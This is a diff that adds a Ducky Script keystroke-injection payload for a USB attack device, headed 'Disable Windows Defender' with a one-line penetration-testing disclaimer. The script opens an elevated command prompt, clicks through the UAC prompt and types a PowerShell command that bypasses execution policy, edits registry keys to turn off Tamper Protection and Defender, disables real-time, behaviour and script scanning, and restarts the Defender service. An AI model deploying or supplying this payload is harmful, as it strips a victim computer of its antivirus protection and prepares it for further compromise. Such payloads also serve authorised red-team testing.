@@ -1,0 +1,16 @@
+REM ============================================
+REM Disable Windows Defender
+REM FOR AUTHORIZED PENETRATION TESTING ONLY
+REM ============================================
+
+DELAY 500
+GUI r
+DELAY 200
+STRING cmd
+CTRL-SHIFT ENTER
+DELAY 800
+ALT y
+DELAY 500
+
+STRING powershell -NoProfile -ExecutionPolicy Bypass -Command "Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows Defender\Features' -Name 'TamperProtection' -Value 0 -Force; Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name 'DisableAntiSpyware' -Value 1 -Force; Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection' -Name 'DisableRealtimeMonitoring' -Value 1 -Force; Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableBlockAtFirstSeen $true -DisableIOAVProtection $true -DisablePrivacyMode $true -DisableScriptScanning $true; Restart-Service WinDefend -Force"
+ENTER
